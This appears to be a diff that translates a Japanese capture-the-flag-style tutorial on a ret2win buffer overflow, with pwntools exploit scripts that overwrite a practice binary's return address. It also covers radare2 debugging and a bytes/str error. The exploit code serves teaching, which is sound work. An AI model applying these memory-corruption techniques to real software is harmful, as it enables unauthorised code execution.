@@ -66,18 +66,18 @@ address = '\x08\x04\x91\xc3'
 パディングと値が分かったので、バイナリをエクスプロイトしましょう。バイナリとやり取りするには [`pwntools`](https://github.com/Gallopsled/pwntools) が使えます(詳しくは [pwntools の記事](../../misc/pwntools/)を参照してください)。
 
 ```python
-from pwn import *        # This is how we import pwntools
+from pwn import *        # pwntools のインポート方法
 
-p = process('./vuln')    # We're starting a new process
+p = process('./vuln')    # 新しいプロセスを開始
 
 payload = 'A' * 52
 payload += '\x08\x04\x91\xc3'
 
-p.clean()                # Receive all the text
+p.clean()                # テキストをすべて受信
 
 p.sendline(payload)
 
-log.info(p.clean())      # Output the "Exploited!" string to know we succeeded
+log.info(p.clean())      # "Exploited!" の文字列を出力して成功を確認
 ```
 
 これを実行すると、小さな問題があって、うまくいきません。なぜでしょうか。デバッガで確認しましょう。`pause()` を入れて、プロセスに `radare2` をアタッチする時間を作ります。
@@ -92,7 +92,7 @@ payload += '\x08\x04\x91\xc3'
 
 log.info(p.clean())
 
-pause()        # add this in
+pause()        # これを追加
 
 p.sendline(payload)
 
@@ -172,7 +172,7 @@ payload += p32(0x080491c3)
 唯一の注意点は、戻り値が文字列ではなく `bytes` であることです。そのため、パディングもバイト列にする必要があります。
 
 ```python
-payload = b'A' * 52        # Notice the "b"
+payload = b'A' * 52        # "b" に注目
 ```
 
 そうしないと、次のエラーが出ます。
@@ -184,15 +184,15 @@ TypeError: can only concatenate str (not "bytes") to str
 ### 最終的なエクスプロイト
 
 ```python
-from pwn import *            # This is how we import pwntools
+from pwn import *            # pwntools のインポート方法
 
-p = process('./vuln')        # We're starting a new process
+p = process('./vuln')        # 新しいプロセスを開始
 
 payload = b'A' * 52
-payload += p32(0x080491c3)   # Use pwntools to pack it
+payload += p32(0x080491c3)   # pwntools でパックする
 
-log.info(p.clean())          # Receive all the text
+log.info(p.clean())          # テキストをすべて受信
 p.sendline(payload)
 
-log.info(p.clean())          # Output the "Exploited!" string to know we succeeded
+log.info(p.clean())          # "Exploited!" の文字列を出力して成功を確認
 ```
